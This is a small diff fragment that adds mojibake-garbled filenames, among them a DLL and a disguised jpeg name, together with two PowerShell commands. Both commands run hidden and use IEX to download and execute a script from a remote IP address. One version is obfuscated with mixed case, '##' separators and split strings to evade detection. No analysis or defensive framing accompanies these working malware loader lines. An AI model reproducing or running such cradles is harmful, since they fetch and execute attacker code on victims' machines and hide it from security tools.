@@ -1,0 +1,6 @@
+
+É±É±É±????xcod.dll
+
+powershell.exe -nOp -w hIdDEn -c $ExeCuTiOnCoNtExT.InvOkeCoMmAnD.NeWScriPtBlOcK("IE##X ((nE##w-ObJe##ct ('nE##T.wEB##cLiEnT')).('doWnl##OadStRiNg').inVo##KE('ht'+'tp:/'+'/10'+'6.55'+'.23'+'1.8'+'8:88'+'72/a'))".Replace('##',''))
+powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://106.55.231.88:8872/a'))"
+.\~$Ö¤¼þÕÕ.jpeg
